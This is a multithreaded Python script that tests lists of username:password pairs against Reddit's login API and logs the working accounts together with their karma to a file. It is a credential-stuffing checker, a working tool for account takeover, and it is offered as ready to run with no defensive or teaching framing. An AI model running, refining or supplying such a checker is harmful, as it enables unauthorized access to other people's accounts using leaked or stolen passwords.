import requests
import Queue
import codecs
import re
import uuid
from threading import Thread

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        user = q.get()
        work = False
        proxies = {
            'http': '127.0.0.1:8888',
            'https': '127.0.0.1:8888'
        }
        s = requests.session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36'
        }
        r = s.post(
            'https://www.reddit.com/api/login/{0}'.format(user.split(':')[0]),
            'op=login-main&user={0}&passwd={1}&api_type=json'.format(user.split(':')[0], user.split(':')[1]),
            verify=False,
            headers=headers,
            # proxies=proxies
        )
        if 'modhash' in r.text:
            r = s.get(
                'https://www.reddit.com/user/{0}'.format(user.split(':')[0]),
                verify=False,
                headers=headers,
                # proxies=proxies
            )

            p = re.findall('karma">(.*?)</span>', r.text)[0]
            l = re.findall('karma comment-karma">(.*?)</span>', r.text)[0]
            f = open("working.txt", "a")
            f.write("{0} - {1}:{2}\n".format(user, p, l))
            f.close()
            print
            "\t\t\t\t\t\t\t{0} WORKS! Karma: {1} post - {2} link".format(user.split(':')[0], p, l)
        elif 'WRONG_PASSWORD' in r.text:
            print
            "{0} doesn't work".format(user.split(':')[0])
        q.task_done()


def main():
    with codecs.open('accounts.txt', 'r') as f:
        users = f.readlines()

    with codecs.open('threads.txt', 'r') as f:
        t = f.read().strip()
    queue = Queue.Queue()
    print
    'Running', t, 'threads'
    for _ in range(int(t)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip())


if __name__ == '__main__':
    main()